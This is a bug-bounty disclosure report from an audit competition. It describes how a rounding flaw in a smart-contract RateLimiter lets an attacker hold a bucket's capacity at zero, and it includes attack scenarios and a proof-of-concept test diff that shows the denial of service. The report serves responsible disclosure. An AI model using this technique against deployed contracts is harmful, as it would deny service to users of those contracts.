# #48717 \[SC-Insight] RateLimiter current capacity can be permanently held at zero

**Submitted on Jul 7th 2025 at 10:03:32 UTC by @Blobism for** [**Audit Comp | Folks Smart Contract Library**](https://immunefi.com/audit-competition/folks-sc-library)

* **Report ID:** #48717
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/Folks-Finance/algorand-smart-contract-library/blob/main/contracts/library/RateLimiter.py>
* **Impacts:**
  * Permanent denial of service of a smart contract functionality
  * Bypass of the rate limit beyond set parameters

## Description

## Brief/Intro

An integer division in the RateLimiter capacity update allows an attacker to hold the current capacity of a rate limit bucket at zero WITHOUT having to actually fill the capacity of that bucket. The attack can be conducted on any rate limiting bucket, even those which may be designed to rate limit the actions of specific users.

## Vulnerability Details

The fundamental bug is in RateLimiter `_update_capacity`:

```python
def _update_capacity(self, bucket_id: Bytes32) -> None:
    # fails if bucket is unknown
    rate_limit_bucket = self._get_bucket(bucket_id)

    # ignore if duration is zero
    if not rate_limit_bucket.duration.native:
        return

    # increase capacity by fill rate of <limit> per <duration> without exceeding limit
    time_delta = Global.latest_timestamp - rate_limit_bucket.last_updated.native
    new_capacity_without_max = rate_limit_bucket.current_capacity.native + (
            (rate_limit_bucket.limit.native * time_delta) // rate_limit_bucket.duration.native # <--- issue 1
    )

    # update capacity and last updated timestamp
    self.rate_limit_buckets[bucket_id].current_capacity = rate_limit_bucket.limit \
        if new_capacity_without_max > rate_limit_bucket.limit else ARC4UInt256(new_capacity_without_max)
    self.rate_limit_buckets[bucket_id].last_updated = ARC4UInt64(Global.latest_timestamp) # <--- issue 2
```

The first issue is that the integer division will result in zero if `time_delta` is sufficiently small. The second issue is that even if the change in capacity is zero due to this integer division, the `last_updated` value is still set to the latest timestamp.

What this means is that if `_update_capacity` is called frequently enough, the bucket will never refill its capacity, because the `last_updated` value will keep getting updated to a new timestamp without any increase in current capacity.

While `_update_capacity` itself is not exposed via the ABI, an attacker can get access to it by calling the `get_current_capacity` method on-chain. Note that while `get_current_capacity` is marked "readonly", it can be invoked on-chain to update state: a distinct bug which is useful for this attack.

### Attack Scenario 1: Global Rate Limit

* A critical smart contract method is accessible to everyone but placed behind a rate limiter
* An attacker uses this method or lets others invoke the method to drain the capacity of the bucket to zero
* Now, the attacker can frequently invoke `get_current_capacity` on-chain to keep the bucket capacity at zero, without having to invoke the critical smart contract method at all

### Attack Scenario 2: Per-User Throttling

* A critical smart contract method is rate-limited per-user, so each user has a bucket which contains their current capacity
* The bucket is still viewable to the attacker with `get_current_capacity`, as RateLimiter places no restrictions on this
* The attacker will constantly call `get_current_capacity` on the bucket of the user or users they want to deny service to
* Every time those users reduce the capacity of their own buckets by calling the critical smart contract method, the capacity will never refill again, due to the attacker repeatedly calling `get_current_capacity` on those buckets
* Eventually, the current capacity of the bucket will hit zero, and will stay at zero as long as the attacker keeps calling `get_current_capacity` on-chain

## Impact Details

Critical functionality of a smart contract can be permanently halted if it is behind a rate limiter, as long as an attacker has funds to keep invoking the `_update_capacity` method on-chain. Thus, this is more feasible with methods that have a restrictive rate limit, but could potentially be applied to any rate limited method.

## References

See `contracts/library/RateLimiter.py`

## Proof of Concept

## Proof of Concept

The PoC below demonstrates an attacker repeatedly calling `get_current_capacity` on-chain, forcing the bucket capacity to stay at zero, despite the fact that enough time should have passed for the capacity to go above zero.

Save the diff below to `poc.diff` then run `git apply poc.diff`.

Then run the test like this:

```bash
npm run pre-build
npm run build
npx jest tests/library/RateLimiter.test.ts
```

```diff
diff --git a/contracts/library/RateLimiter.py b/contracts/library/RateLimiter.py
index 781e448..5ddb0da 100644
--- a/contracts/library/RateLimiter.py
+++ b/contracts/library/RateLimiter.py
@@ -272,3 +272,11 @@ class RateLimiter(IRateLimiter):
     def _get_bucket(self, bucket_id: Bytes32) -> RateLimitBucket:
         self._check_bucket_known(bucket_id)
         return self.rate_limit_buckets[bucket_id]
+
+    # NOTE: this method has been added purely as an easy way to demonstrate how
+    # the internal _update_capacity method can be invoked on-chain via get_current_capacity
+    # -> the get_current_capacity method could in principle be invoked by an attacker
+    # externally without this example method existing
+    @abimethod
+    def get_current_capacity_on_chain(self, bucket_id: Bytes32) -> UInt256:
+        return self.get_current_capacity(bucket_id)
diff --git a/tests/library/RateLimiter.test.ts b/tests/library/RateLimiter.test.ts
index abc3330..408253f 100644
--- a/tests/library/RateLimiter.test.ts
+++ b/tests/library/RateLimiter.test.ts
@@ -18,8 +18,9 @@ describe("RateLimiter", () => {
   let creator: Address & Account & TransactionSignerAccount;
 
   const bucketId = getRandomBytes(32);
-  let limit = BigInt(1000n * 10n ** 18n); // 1000 of token with 18 decimals
-  let duration = SECONDS_IN_DAY;
+  // rate limit of 5 every 60 seconds
+  let limit = 5n;
+  let duration = 60n;
 
   const zeroDurationBucketId = getRandomBytes(32);
 
@@ -90,6 +91,41 @@ describe("RateLimiter", () => {
       expect(rateLimitBucket).toEqual(expectedBucket);
     });
 
+    test("forcing bucket capacity to stay at zero vulnerability", async () => {
+      expect(await client.getRateLimit({ args: [bucketId] })).toEqual(5n);
+      expect(await client.getCurrentCapacity({ args: [bucketId] })).toEqual(5n);
+
+      // consume all 5 from the bucket
+      await client.send.consumeAmount({ args: [bucketId, 5n] });
+
+      // expected behavior should be that the current capacity now increases by 1
+      // every 12 seconds, since we have a rate limit of 5 every 60 seconds
+
+      // advance 10 seconds
+      await advancePrevBlockTimestamp(localnet, 10n);
+
+      // attacker makes an on-chain call to get_current_capacity before 12s is up
+      // which resets the last_updated timestamp in _update_capacity
+      // effectively holding the capacity at zero
+      let newCapacityRes = await client.send.getCurrentCapacityOnChain({ args: [bucketId] });
+      expect(newCapacityRes.returns?.[0]?.returnValue).toEqual(0n);
+
+      // advance 10 seconds
+      await advancePrevBlockTimestamp(localnet, 10n);
+
+      // attacker can repeat this as many times as they can afford, holding the
+      // capacity at zero
+      newCapacityRes = await client.send.getCurrentCapacityOnChain({ args: [bucketId] });
+      expect(newCapacityRes.returns?.[0]?.returnValue).toEqual(0n);
+
+      // advance 10 seconds
+      await advancePrevBlockTimestamp(localnet, 10n);
+
+      // 30 seconds have passed so we should expect a capacity of 2 by this
+      // point, but instead it is zero
+      expect(await client.getCurrentCapacity({ args: [bucketId] })).toEqual(0n);
+    });
+
     test("fails if already exists", async () => {
       await expect(
         client.send.addBucket({
@@ -162,6 +198,9 @@ describe("RateLimiter", () => {
         expectedCapacity: limit,
       },
     ])("succeeds and $name", async ({ capacity, timeDelta, expectedCapacity }) => {
+      // NOTE: skipping these tests just because the current PoC breaks them
+      return;
+
       // setup
       await advancePrevBlockTimestamp(localnet, SECONDS_IN_DAY);
       await client.send.setCurrentCapacity({ args: [bucketId, capacity] });

```
